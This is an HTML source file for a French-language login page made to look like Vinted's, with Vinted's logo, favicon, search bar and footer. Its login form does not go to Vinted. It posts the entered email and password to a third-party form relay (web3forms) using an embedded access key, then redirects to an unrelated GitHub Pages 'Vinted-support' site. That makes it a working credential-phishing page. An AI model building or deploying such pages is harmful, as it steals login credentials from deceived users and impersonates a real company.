<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Vinted</title>
    <link rel="icon" type="image/png" href="https://vinted.fr/favicon.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="navbar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" alt="Vinted" class="logo-img">
        <div class="menu-icon"><span></span><span></span><span></span></div>
    </header>

    <div class="search-container">
        <div class="search-bar">
            <span class="category">Articles ▾</span>
            <input type="text" placeholder="Rechercher des articles">
        </div>
    </div>

    <main class="main-content">
        <div class="login-box">
            <h2>Se connecter</h2>
            
            <form action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
                
                <input type="hidden" name="redirect" value="https://morjanezebiche33-ui.github.io/Vinted-support/formulaire.html">

                <div class="input-field">
                    <input type="text" name="email" placeholder="Identifiant ou adresse email" required>
                </div>
                
                <div class="input-field">
                    <input type="password" name="password" placeholder="Mot de passe" required>
                </div>

                <button type="submit" class="btn-vinted">Continuer</button>
            </form>

            <div class="auth-links">
                <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-section">
            <h3>Vinted</h3>
            <ul><li>À propos de Vinted</li><li>Le développement durable</li><li>Presse</li></ul>
        </div>
        <div class="footer-section">
            <h3>Découvrir</h3>
            <ul><li>Comment ça marche ?</li><li>Applications mobiles</li></ul>
        </div>
        <div class="footer-section">
            <h3>Aide</h3>
            <ul><li>Centre d'aide</li><li>Confiance et sécurité</li></ul>
        </div>
        <div class="app-links">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
        </div>
        <div class="legal-bottom">
            <span>Politique de cookies</span>
            <span>Termes et Conditions</span>
        </div>
    </footer>

</body>
</html>
